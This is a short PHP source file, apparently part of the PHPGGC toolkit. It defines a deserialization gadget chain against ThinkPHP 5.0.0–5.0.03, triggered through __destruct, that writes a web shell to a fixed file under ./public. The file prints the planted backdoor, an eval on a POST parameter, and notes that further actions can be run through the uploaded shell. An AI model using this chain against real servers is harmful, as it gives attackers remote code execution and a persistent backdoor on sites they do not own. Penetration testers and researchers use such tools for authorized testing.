<?php

namespace GadgetChain\ThinkPHP;

class FW2 extends \PHPGGC\GadgetChain\WriteShell
{
    public static $version = '5.0.0-5.0.03';
    public static $vector = '__destruct';
    public static $author = 'zcy2018';
    public static $information = '
        We do not have full control of the path. Also, the path will turn to
        a long hex value(md5) depends on the payload, and the payload have 
        some limitation as well. For stablity, I just fix the path and data. 
        Your file path will be ./public/6dccbcbfa361492bb822877468aade88.php,
        and the content of the data will be ��M4�M4�M4�δ<?php eval($_POST[\'zcy2018\']); ?>��y�����
        So there is no need to pass parameters. You can do further options through the upload shell.
        Tested on Windows with php7.3.4 and apache2.4.39.
    ';
    public function generate(array $parameters)
    {
        return new \think\Process();
    }
}